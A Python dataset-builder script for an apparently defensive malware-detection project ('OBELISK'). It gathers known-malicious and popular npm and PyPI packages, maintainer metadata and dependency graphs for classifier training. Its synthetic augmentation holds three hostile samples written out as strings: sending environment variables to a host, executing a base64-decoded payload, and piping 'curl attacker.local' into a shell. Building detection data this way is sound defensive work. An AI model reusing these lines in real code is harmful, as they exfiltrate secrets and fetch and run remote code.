#!/usr/bin/env python3
"""Collect and normalize OBELISK training datasets into a single offline format.

This script builds:
1) A unified JSONL corpus for all model families.
2) Model-specific files compatible with existing training scripts.

Outputs:
- processed/unified/unified_samples.jsonl
- processed/codebert/dataset.csv
- processed/maintainers/maintainer_features.csv
- processed/dependency_graphs/*.json

Security note:
- This script only downloads and parses source text/metadata.
- It does not execute package code.
"""

from __future__ import annotations

import argparse
import csv
import json
import random
import re
import shutil
import subprocess
import sys
import tarfile
import zipfile
from dataclasses import dataclass
from datetime import datetime, timezone
from pathlib import Path
from typing import Any
from urllib.error import HTTPError, URLError
from urllib.parse import quote
from urllib.request import Request, urlopen


USER_AGENT = "OBELISK-dataset-builder/1.0"


DEFAULT_TOP_NPM = [
    "react", "lodash", "express", "axios", "chalk", "moment", "debug",
    "commander", "uuid", "typescript", "webpack", "eslint", "dotenv",
    "jest", "next", "vue", "rxjs", "zod", "mongoose", "socket.io",
]

DEFAULT_TOP_PYPI = [
    "requests", "urllib3", "certifi", "charset-normalizer", "idna", "numpy",
    "pandas", "boto3", "packaging", "click", "pyyaml", "jinja2", "flask",
    "fastapi", "pydantic", "sqlalchemy", "pytest", "scipy", "matplotlib",
]


@dataclass
class Sample:
    sample_id: str
    task: str
    label: int
    source: str
    package: str
    language: str | None = None
    code: str | None = None
    maintainer_features: dict[str, Any] | None = None
    graph: dict[str, Any] | None = None
    meta: dict[str, Any] | None = None

    def as_json(self) -> str:
        payload: dict[str, Any] = {
            "id": self.sample_id,
            "task": self.task,
            "label": self.label,
            "source": self.source,
            "package": self.package,
        }
        if self.language is not None:
            payload["language"] = self.language
        if self.code is not None:
            payload["code"] = self.code
        if self.maintainer_features is not None:
            payload["maintainer_features"] = self.maintainer_features
        if self.graph is not None:
            payload["graph"] = self.graph
        if self.meta is not None:
            payload["meta"] = self.meta
        return json.dumps(payload, ensure_ascii=True)


class DatasetBuilder:
    def __init__(self, root: Path, args: argparse.Namespace):
        self.root = root
        self.args = args

        self.raw = root / "raw"
        self.raw_repos = self.raw / "repos"
        self.raw_npm = self.raw / "npm_packages"
        self.raw_pypi = self.raw / "pypi_packages"

        self.processed = root / "processed"
        self.out_unified = self.processed / "unified"
        self.out_codebert = self.processed / "codebert"
        self.out_maintainers = self.processed / "maintainers"
        self.out_graphs = self.processed / "dependency_graphs"
        self.raw_manual = self.raw / "manual"
        self.python_exec = sys.executable
        self.pip_available = self._detect_pip()

        self.samples: list[Sample] = []
        self._id_counter = 0

        for d in [
            self.raw,
            self.raw_repos,
            self.raw_npm,
            self.raw_pypi,
            self.raw_manual,
            self.processed,
            self.out_unified,
            self.out_codebert,
            self.out_maintainers,
            self.out_graphs,
        ]:
            d.mkdir(parents=True, exist_ok=True)

    def run(self) -> None:
        if not self.args.offline_only:
            self.fetch_repositories()
            self.fetch_package_sources()

        self.collect_samples_from_raw()
        self.generate_synthetic_augmentation()
        self.write_outputs()

    def log(self, msg: str) -> None:
        print(f"[dataset] {msg}")

    def _next_id(self, prefix: str) -> str:
        self._id_counter += 1
        return f"{prefix}-{self._id_counter:07d}"

    def _http_json(self, url: str) -> Any:
        req = Request(url, headers={"User-Agent": USER_AGENT})
        with urlopen(req, timeout=60) as resp:
            return json.load(resp)

    def _safe_run(self, cmd: list[str], cwd: Path | None = None) -> bool:
        try:
            subprocess.run(cmd, cwd=cwd, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            return True
        except Exception as exc:
            self.log(f"Command failed: {' '.join(cmd)} ({exc})")
            return False

    def _detect_pip(self) -> bool:
        try:
            subprocess.run(
                [self.python_exec, "-m", "pip", "--version"],
                check=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
            )
            return True
        except Exception:
            return False

    def _clone_or_pull(self, repo_url: str, target: Path) -> None:
        if target.exists() and (target / ".git").exists():
            self.log(f"Updating {target.name}")
            self._safe_run(["git", "pull", "--ff-only"], cwd=target)
            return
        self.log(f"Cloning {repo_url}")
        self._safe_run(["git", "clone", "--depth", "1", repo_url, str(target)])

    def fetch_repositories(self) -> None:
        repos = {
            "backstabbers": "https://github.com/dasfreak/Backstabbers-Knife-Collection.git",
            "github-advisory-database": "https://github.com/github/advisory-database.git",
        }
        for name, url in repos.items():
            self._clone_or_pull(url, self.raw_repos / name)

    def _extract_archive(self, archive_path: Path, dest_dir: Path) -> Path | None:
        dest_dir.mkdir(parents=True, exist_ok=True)
        extract_dir = dest_dir / archive_path.stem.replace(".tar", "")
        extract_dir.mkdir(parents=True, exist_ok=True)
        try:
            if archive_path.suffix == ".zip":
                with zipfile.ZipFile(archive_path) as zf:
                    zf.extractall(extract_dir)
            elif archive_path.suffix in {".tgz", ".gz"} or archive_path.name.endswith(".tar.gz"):
                with tarfile.open(archive_path, "r:*") as tf:
                    tf.extractall(extract_dir)
            else:
                return None
            return extract_dir
        except Exception as exc:
            self.log(f"Archive extract failed for {archive_path.name}: {exc}")
            return None

    def _read_text_safe(self, path: Path, max_chars: int = 30000) -> str | None:
        try:
            data = path.read_text(encoding="utf-8", errors="ignore")
            data = data.strip()
            if len(data) < 60:
                return None
            return data[:max_chars]
        except Exception:
            return None

    def _iter_code_files(self, root: Path) -> list[Path]:
        exts = {".py", ".js", ".ts", ".jsx", ".tsx"}
        files: list[Path] = []
        for p in root.rglob("*"):
            if not p.is_file():
                continue
            if p.suffix.lower() not in exts:
                continue
            if any(part in {"node_modules", ".git", "dist", "build", "__pycache__"} for part in p.parts):
                continue
            files.append(p)
        return files

    def _collect_code_from_dir(self, root: Path, label: int, source: str, package: str, limit: int) -> int:
        count = 0
        for file in self._iter_code_files(root):
            if count >= limit:
                break
            text = self._read_text_safe(file)
            if not text:
                continue
            lang = "python" if file.suffix.lower() == ".py" else "javascript"
            self.samples.append(Sample(
                sample_id=self._next_id("code"),
                task="codebert",
                label=label,
                source=source,
                package=package,
                language=lang,
                code=text,
                meta={"path": str(file.relative_to(root))},
            ))
            count += 1
        return count

    def _npm_pack_and_extract(self, pkg: str, target_dir: Path) -> Path | None:
        work_dir = target_dir / pkg.replace("/", "__")
        work_dir.mkdir(parents=True, exist_ok=True)

        cmd = ["npm", "pack", pkg, "--silent"]
        try:
            proc = subprocess.run(cmd, cwd=work_dir, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            tar_name = proc.stdout.strip().splitlines()[-1].strip()
            tar_path = work_dir / tar_name
            if not tar_path.exists():
                return None
            extract_to = work_dir / "src"
            extract_to.mkdir(parents=True, exist_ok=True)
            with tarfile.open(tar_path, "r:*") as tf:
                tf.extractall(extract_to)
            tar_path.unlink(missing_ok=True)
            return extract_to
        except Exception as exc:
            self.log(f"npm pack failed for {pkg}: {exc}")
            return None

    def _pip_download_and_extract(self, pkg: str, target_dir: Path) -> Path | None:
        if not self.pip_available:
            return None
        work_dir = target_dir / pkg.replace("/", "__")
        work_dir.mkdir(parents=True, exist_ok=True)
        cmd = [self.python_exec, "-m", "pip", "download", "--no-deps", pkg, "-d", str(work_dir)]
        if not self._safe_run(cmd):
            return None

        archives = sorted(work_dir.glob("*.whl")) + sorted(work_dir.glob("*.zip")) + sorted(work_dir.glob("*.tar.gz"))
        if not archives:
            return None

        extract_root = work_dir / "src"
        extract_root.mkdir(parents=True, exist_ok=True)
        extracted_any = False

        for archive in archives[:1]:
            if archive.suffix == ".whl" or archive.suffix == ".zip":
                try:
                    with zipfile.ZipFile(archive) as zf:
                        zf.extractall(extract_root)
                    extracted_any = True
                except Exception:
                    pass
            elif archive.name.endswith(".tar.gz"):
                try:
                    with tarfile.open(archive, "r:*") as tf:
                        tf.extractall(extract_root)
                    extracted_any = True
                except Exception:
                    pass

        return extract_root if extracted_any else None

    def _get_npm_top_packages(self, limit: int) -> list[str]:
        # Stable fallback list; avoids dependence on fluctuating API shape.
        return DEFAULT_TOP_NPM[:limit]

    def _get_pypi_top_packages(self, limit: int) -> list[str]:
        url = "https://hugovk.github.io/top-pypi-packages/top-pypi-packages-30-days.min.json"
        try:
            data = self._http_json(url)
            rows = data.get("rows", [])
            pkgs = [row.get("project") for row in rows if row.get("project")]
            return pkgs[:limit]
        except Exception as exc:
            self.log(f"Could not fetch top PyPI list, using fallback: {exc}")
            return DEFAULT_TOP_PYPI[:limit]

    def _extract_advisory_package_names(self) -> tuple[set[str], set[str]]:
        npm_names: set[str] = set()
        pypi_names: set[str] = set()

        gh_repo = self.raw_repos / "github-advisory-database"
        if gh_repo.exists():
            for path in gh_repo.rglob("*.json"):
                try:
                    data = json.loads(path.read_text(encoding="utf-8", errors="ignore"))
                except Exception:
                    continue
                affected = data.get("affected", [])
                if not isinstance(affected, list):
                    continue
                for item in affected:
                    pkg = item.get("package", {}) if isinstance(item, dict) else {}
                    eco = str(pkg.get("ecosystem", "")).lower()
                    name = pkg.get("name")
                    if not isinstance(name, str) or not name.strip():
                        continue
                    name = name.strip()
                    if eco == "npm":
                        npm_names.add(name)
                    elif eco == "pypi":
                        pypi_names.add(name)

        return npm_names, pypi_names

    def fetch_package_sources(self) -> None:
        npm_malicious, pypi_malicious = self._extract_advisory_package_names()

        npm_malicious_list = sorted(npm_malicious)[: self.args.max_npm_malicious]
        pypi_malicious_list = sorted(pypi_malicious)[: self.args.max_pypi_malicious]
        npm_benign_list = self._get_npm_top_packages(self.args.max_npm_benign)
        pypi_benign_list = self._get_pypi_top_packages(self.args.max_pypi_benign)

        self.log(
            f"Planned packages: npm malicious={len(npm_malicious_list)}, "
            f"npm benign={len(npm_benign_list)}, pypi malicious={len(pypi_malicious_list)}, "
            f"pypi benign={len(pypi_benign_list)}"
        )

        for pkg in npm_malicious_list:
            self._npm_pack_and_extract(pkg, self.raw_npm / "malicious")
        for pkg in npm_benign_list:
            self._npm_pack_and_extract(pkg, self.raw_npm / "benign")

        for pkg in pypi_malicious_list:
            self._pip_download_and_extract(pkg, self.raw_pypi / "malicious")
        for pkg in pypi_benign_list:
            self._pip_download_and_extract(pkg, self.raw_pypi / "benign")

        if not self.pip_available:
            self.log("python3 -m pip is not available; skipping PyPI source downloads")

    def _iso_days_since(self, date_str: str | None) -> int:
        if not date_str:
            return 365
        try:
            clean = date_str.replace("Z", "+00:00")
            dt = datetime.fromisoformat(clean)
            if dt.tzinfo is None:
                dt = dt.replace(tzinfo=timezone.utc)
            return max((datetime.now(timezone.utc) - dt).days, 1)
        except Exception:
            return 365

    def _build_maintainer_features_npm(self, pkg: str, label: int) -> dict[str, Any] | None:
        url = f"https://registry.npmjs.org/{quote(pkg)}"
        try:
            data = self._http_json(url)
        except Exception:
            return None

        maintainers = data.get("maintainers", [])
        maintainer_email = ""
        if maintainers and isinstance(maintainers, list) and isinstance(maintainers[0], dict):
            maintainer_email = str(maintainers[0].get("email", ""))

        t = data.get("time", {}) if isinstance(data.get("time"), dict) else {}
        created = t.get("created")
        versions = data.get("versions", {}) if isinstance(data.get("versions"), dict) else {}
        total_packages = 1

        return {
            "package": pkg,
            "ecosystem": "npm",
            "account_age_days": self._iso_days_since(created),
            "total_packages": total_packages,
            "github_repos": 1,
            "previous_downloads": 0,
            "has_verified_email": 1 if maintainer_email and "@" in maintainer_email else 0,
            "email": maintainer_email,
            "label": label,
        }

    def _build_maintainer_features_pypi(self, pkg: str, label: int) -> dict[str, Any] | None:
        url = f"https://pypi.org/pypi/{quote(pkg)}/json"
        try:
            data = self._http_json(url)
        except Exception:
            return None

        info = data.get("info", {}) if isinstance(data.get("info"), dict) else {}
        releases = data.get("releases", {}) if isinstance(data.get("releases"), dict) else {}

        first_upload: str | None = None
        for rel_items in releases.values():
            if not isinstance(rel_items, list):
                continue
            for item in rel_items:
                if not isinstance(item, dict):
                    continue
                ts = item.get("upload_time_iso_8601") or item.get("upload_time")
                if isinstance(ts, str) and (first_upload is None or ts < first_upload):
                    first_upload = ts

        author_email = str(info.get("author_email", ""))
        return {
            "package": pkg,
            "ecosystem": "pypi",
            "account_age_days": self._iso_days_since(first_upload),
            "total_packages": 1,
            "github_repos": 1,
            "previous_downloads": 0,
            "has_verified_email": 1 if author_email and "@" in author_email else 0,
            "email": author_email,
            "label": label,
        }

    def _npm_dependency_graph(self, pkg: str, label: int) -> dict[str, Any] | None:
        url = f"https://registry.npmjs.org/{quote(pkg)}/latest"
        try:
            data = self._http_json(url)
        except Exception:
            return None

        deps = data.get("dependencies", {})
        if not isinstance(deps, dict):
            deps = {}

        nodes = [{"name": pkg, "risk_score": 80 if label == 1 else 5, "is_malicious": label == 1, "downloads": 0, "dep_count": len(deps)}]
        edges: list[list[int]] = []

        idx = 1
        for dep_name in list(deps.keys())[:200]:
            nodes.append({"name": dep_name, "risk_score": 0, "is_malicious": False, "downloads": 0, "dep_count": 0})
            edges.append([0, idx])
            idx += 1

        return {"nodes": nodes, "edges": edges, "label": label, "package": pkg, "ecosystem": "npm"}

    def _pypi_dependency_graph(self, pkg: str, label: int) -> dict[str, Any] | None:
        url = f"https://pypi.org/pypi/{quote(pkg)}/json"
        try:
            data = self._http_json(url)
        except Exception:
            return None

        info = data.get("info", {}) if isinstance(data.get("info"), dict) else {}
        reqs = info.get("requires_dist") or []
        if not isinstance(reqs, list):
            reqs = []

        deps: list[str] = []
        for item in reqs[:200]:
            if not isinstance(item, str):
                continue
            name = re.split(r"[\s\[\(;><=]", item, maxsplit=1)[0].strip()
            if name:
                deps.append(name)

        nodes = [{"name": pkg, "risk_score": 80 if label == 1 else 5, "is_malicious": label == 1, "downloads": 0, "dep_count": len(deps)}]
        edges: list[list[int]] = []
        idx = 1
        for dep_name in deps:
            nodes.append({"name": dep_name, "risk_score": 0, "is_malicious": False, "downloads": 0, "dep_count": 0})
            edges.append([0, idx])
            idx += 1

        return {"nodes": nodes, "edges": edges, "label": label, "package": pkg, "ecosystem": "pypi"}

    def collect_samples_from_raw(self) -> None:
        random.seed(self.args.seed)

        # Backstabbers repository is high-quality malicious Python source.
        backstabbers = self.raw_repos / "backstabbers"
        if backstabbers.exists():
            count = self._collect_code_from_dir(
                backstabbers,
                label=1,
                source="backstabbers",
                package="mixed",
                limit=self.args.max_backstabber_files,
            )
            self.log(f"Collected {count} malicious code samples from backstabbers")

        # Malicious/benign npm package source snapshots.
        for bucket, label in [("malicious", 1), ("benign", 0)]:
            base = self.raw_npm / bucket
            if not base.exists():
                continue
            for pkg_dir in base.iterdir():
                src = pkg_dir / "src"
                if not src.exists():
                    continue
                self._collect_code_from_dir(
                    src,
                    label=label,
                    source=f"npm-{bucket}",
                    package=pkg_dir.name.replace("__", "/"),
                    limit=self.args.max_files_per_package,
                )

        # Malicious/benign PyPI package source snapshots.
        for bucket, label in [("malicious", 1), ("benign", 0)]:
            base = self.raw_pypi / bucket
            if not base.exists():
                continue
            for pkg_dir in base.iterdir():
                src = pkg_dir / "src"
                if not src.exists():
                    continue
                self._collect_code_from_dir(
                    src,
                    label=label,
                    source=f"pypi-{bucket}",
                    package=pkg_dir.name,
                    limit=self.args.max_files_per_package,
                )

        # Create maintainer and graph samples from package sets.
        npm_malicious, pypi_malicious = self._extract_advisory_package_names()
        npm_benign = self._get_npm_top_packages(self.args.max_npm_benign)
        pypi_benign = self._get_pypi_top_packages(self.args.max_pypi_benign)

        for pkg in sorted(list(npm_malicious))[: self.args.max_npm_malicious]:
            self._add_maintainer_and_graph(pkg, "npm", 1)
        for pkg in npm_benign:
            self._add_maintainer_and_graph(pkg, "npm", 0)

        for pkg in sorted(list(pypi_malicious))[: self.args.max_pypi_malicious]:
            self._add_maintainer_and_graph(pkg, "pypi", 1)
        for pkg in pypi_benign:
            self._add_maintainer_and_graph(pkg, "pypi", 0)

        # Optional manual datasets drop-zone support.
        self._collect_manual_codesearchnet()
        self._collect_manual_malware_source()
        self._collect_manual_librariesio_graphs()

    def _collect_manual_codesearchnet(self) -> None:
        # Expect json/jsonl files under raw/manual/codesearchnet.
        base = self.raw_manual / "codesearchnet"
        if not base.exists():
            return

        added = 0
        for path in list(base.rglob("*.jsonl")) + list(base.rglob("*.json")):
            if added >= self.args.max_manual_codesearchnet:
                break
            try:
                if path.suffix == ".jsonl":
                    lines = path.read_text(encoding="utf-8", errors="ignore").splitlines()
                    for line in lines:
                        if added >= self.args.max_manual_codesearchnet:
                            break
                        line = line.strip()
                        if not line:
                            continue
                        obj = json.loads(line)
                        code = obj.get("code")
                        if not isinstance(code, str) or len(code.strip()) < 60:
                            continue
                        language = str(obj.get("language", "python")).lower()
                        self.samples.append(Sample(
                            sample_id=self._next_id("code"),
                            task="codebert",
                            label=0,
                            source="codesearchnet-manual",
                            package=str(obj.get("repo", "unknown")),
                            language="javascript" if "javascript" in language else "python",
                            code=code[:30000],
                        ))
                        added += 1
                else:
                    data = json.loads(path.read_text(encoding="utf-8", errors="ignore"))
                    if isinstance(data, list):
                        for obj in data:
                            if added >= self.args.max_manual_codesearchnet:
                                break
                            if not isinstance(obj, dict):
                                continue
                            code = obj.get("code")
                            if not isinstance(code, str) or len(code.strip()) < 60:
                                continue
                            language = str(obj.get("language", "python")).lower()
                            self.samples.append(Sample(
                                sample_id=self._next_id("code"),
                                task="codebert",
                                label=0,
                                source="codesearchnet-manual",
                                package=str(obj.get("repo", "unknown")),
                                language="javascript" if "javascript" in language else "python",
                                code=code[:30000],
                            ))
                            added += 1
            except Exception:
                continue

        if added:
            self.log(f"Collected {added} benign code samples from manual CodeSearchNet data")

    def _collect_manual_malware_source(self) -> None:
        # Expect unpacked sources under raw/manual/malwaresourcecode.
        base = self.raw_manual / "malwaresourcecode"
        if not base.exists():
            return

        added = self._collect_code_from_dir(
            base,
            label=1,
            source="malwaresourcecode-manual",
            package="mixed",
            limit=self.args.max_manual_malware_files,
        )
        if added:
            self.log(f"Collected {added} malicious code samples from manual malware source dataset")

    def _collect_manual_librariesio_graphs(self) -> None:
        # Expect dependencies.csv under raw/manual/librariesio.
        csv_path = self.raw_manual / "librariesio" / "dependencies.csv"
        if not csv_path.exists():
            return

        edges_by_project: dict[str, list[str]] = {}
        try:
            with open(csv_path, "r", encoding="utf-8", errors="ignore", newline="") as f:
                reader = csv.DictReader(f)
                for row in reader:
                    if len(edges_by_project) >= self.args.max_manual_librariesio_projects:
                        break
                    project = row.get("Project Name") or row.get("project_name")
                    dep = row.get("Dependency Name") or row.get("dependency_name")
                    if not project or not dep:
                        continue
                    edges_by_project.setdefault(project, [])
                    if len(edges_by_project[project]) < 200:
                        edges_by_project[project].append(dep)
        except Exception as exc:
            self.log(f"Failed to parse manual Libraries.io data: {exc}")
            return

        added = 0
        for project, deps in edges_by_project.items():
            nodes = [{"name": project, "risk_score": 5, "is_malicious": False, "downloads": 0, "dep_count": len(deps)}]
            edges = []
            idx = 1
            for dep in deps:
                nodes.append({"name": dep, "risk_score": 0, "is_malicious": False, "downloads": 0, "dep_count": 0})
                edges.append([0, idx])
                idx += 1
            self.samples.append(Sample(
                sample_id=self._next_id("graph"),
                task="gnn",
                label=0,
                source="librariesio-manual",
                package=project,
                graph={"nodes": nodes, "edges": edges, "label": 0, "package": project, "ecosystem": "mixed"},
            ))
            added += 1

        if added:
            self.log(f"Collected {added} graph samples from manual Libraries.io data")

    def _add_maintainer_and_graph(self, pkg: str, ecosystem: str, label: int) -> None:
        maint = None
        graph = None
        if ecosystem == "npm":
            maint = self._build_maintainer_features_npm(pkg, label)
            graph = self._npm_dependency_graph(pkg, label)
        elif ecosystem == "pypi":
            maint = self._build_maintainer_features_pypi(pkg, label)
            graph = self._pypi_dependency_graph(pkg, label)

        if maint:
            self.samples.append(Sample(
                sample_id=self._next_id("maintainer"),
                task="anomaly",
                label=label,
                source=f"{ecosystem}-registry",
                package=pkg,
                maintainer_features=maint,
            ))

        if graph:
            self.samples.append(Sample(
                sample_id=self._next_id("graph"),
                task="gnn",
                label=label,
                source=f"{ecosystem}-registry",
                package=pkg,
                graph=graph,
            ))

    def generate_synthetic_augmentation(self) -> None:
        if self.args.synthetic_code_samples <= 0:
            return

        malicious_patterns = [
            "import os\nimport requests\nrequests.post('http://example.com', data=str(os.environ))\n",
            "import base64\npayload = base64.b64decode('aW1wb3J0IG9z')\nexec(payload)\n",
            "const cp = require('child_process');\ncp.exec('curl attacker.local/p | sh');\n",
        ]
        benign_patterns = [
            "def calculate_average(values):\n    return sum(values)/len(values) if values else 0\n",
            "export function add(a, b) { return a + b; }\n",
            "from fastapi import FastAPI\napp = FastAPI()\n",
        ]

        half = self.args.synthetic_code_samples // 2
        for i in range(half):
            text = random.choice(malicious_patterns)
            self.samples.append(Sample(
                sample_id=self._next_id("code"),
                task="codebert",
                label=1,
                source="synthetic",
                package=f"synthetic-mal-{i}",
                language="python",
                code=text,
            ))
        for i in range(self.args.synthetic_code_samples - half):
            text = random.choice(benign_patterns)
            self.samples.append(Sample(
                sample_id=self._next_id("code"),
                task="codebert",
                label=0,
                source="synthetic",
                package=f"synthetic-ben-{i}",
                language="python",
                code=text,
            ))

    def write_outputs(self) -> None:
        # Unified JSONL
        unified_file = self.out_unified / "unified_samples.jsonl"
        with open(unified_file, "w", encoding="utf-8") as f:
            for s in self.samples:
                f.write(s.as_json() + "\n")

        # CodeBERT CSV expected by train_codebert.py
        code_samples = [s for s in self.samples if s.task == "codebert" and s.code is not None]
        code_csv = self.out_codebert / "dataset.csv"
        with open(code_csv, "w", encoding="utf-8", newline="") as f:
            writer = csv.DictWriter(f, fieldnames=["id", "code", "label", "language", "source", "package"])
            writer.writeheader()
            for s in code_samples:
                writer.writerow({
                    "id": s.sample_id,
                    "code": s.code,
                    "label": s.label,
                    "language": s.language or "unknown",
                    "source": s.source,
                    "package": s.package,
                })

        # Maintainer CSV expected by train_isolation_forest.py
        maint_samples = [s for s in self.samples if s.task == "anomaly" and s.maintainer_features is not None]
        maint_csv = self.out_maintainers / "maintainer_features.csv"
        with open(maint_csv, "w", encoding="utf-8", newline="") as f:
            fields = [
                "package", "ecosystem", "account_age_days", "total_packages",
                "github_repos", "previous_downloads", "has_verified_email", "email", "label",
            ]
            writer = csv.DictWriter(f, fieldnames=fields)
            writer.writeheader()
            for s in maint_samples:
                writer.writerow(s.maintainer_features)

        # GNN JSON graph files expected by train_gnn.py
        graph_samples = [s for s in self.samples if s.task == "gnn" and s.graph is not None]
        for old in self.out_graphs.glob("*.json"):
            old.unlink()
        for i, s in enumerate(graph_samples, start=1):
            out = self.out_graphs / f"graph_{i:06d}.json"
            with open(out, "w", encoding="utf-8") as f:
                json.dump(s.graph, f, ensure_ascii=True)

        summary = {
            "total_samples": len(self.samples),
            "codebert_samples": len(code_samples),
            "anomaly_samples": len(maint_samples),
            "gnn_samples": len(graph_samples),
            "generated_at": datetime.now(timezone.utc).isoformat(),
            "outputs": {
                "unified": str(unified_file),
                "codebert_csv": str(code_csv),
                "maintainer_csv": str(maint_csv),
                "gnn_dir": str(self.out_graphs),
            },
        }
        with open(self.out_unified / "summary.json", "w", encoding="utf-8") as f:
            json.dump(summary, f, indent=2)

        self.log(json.dumps(summary, indent=2))


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="Collect and normalize OBELISK ML datasets")
    parser.add_argument("--dataset-root", default=str(Path(__file__).resolve().parent), help="Dataset root directory")
    parser.add_argument("--offline-only", action="store_true", help="Skip downloading and process only existing raw data")
    parser.add_argument("--seed", type=int, default=42)

    parser.add_argument("--max-backstabber-files", type=int, default=2500)
    parser.add_argument("--max-files-per-package", type=int, default=20)
    parser.add_argument("--max-npm-malicious", type=int, default=300)
    parser.add_argument("--max-npm-benign", type=int, default=300)
    parser.add_argument("--max-pypi-malicious", type=int, default=300)
    parser.add_argument("--max-pypi-benign", type=int, default=300)
    parser.add_argument("--synthetic-code-samples", type=int, default=1000)
    parser.add_argument("--max-manual-codesearchnet", type=int, default=5000)
    parser.add_argument("--max-manual-malware-files", type=int, default=5000)
    parser.add_argument("--max-manual-librariesio-projects", type=int, default=1000)

    return parser.parse_args()


def main() -> None:
    args = parse_args()
    root = Path(args.dataset_root).resolve()
    builder = DatasetBuilder(root, args)
    builder.run()


if __name__ == "__main__":
    main()
